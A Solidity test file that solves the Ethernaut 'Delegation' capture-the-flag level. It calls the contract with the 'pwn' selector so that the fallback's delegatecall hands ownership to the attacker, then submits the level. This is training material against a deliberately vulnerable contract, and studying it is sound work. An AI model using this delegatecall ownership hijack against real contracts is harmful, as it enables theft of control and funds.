pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Delegation/DelegationFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";


contract DelegationTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testDelegationHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        DelegationFactory telephoneFactory = new DelegationFactory();
        ethernaut.registerLevel(telephoneFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(telephoneFactory);
        Delegation ethernautDelegation = Delegation(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        address(ethernautDelegation).call(abi.encodePacked(Delegate.pwn.selector));


        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
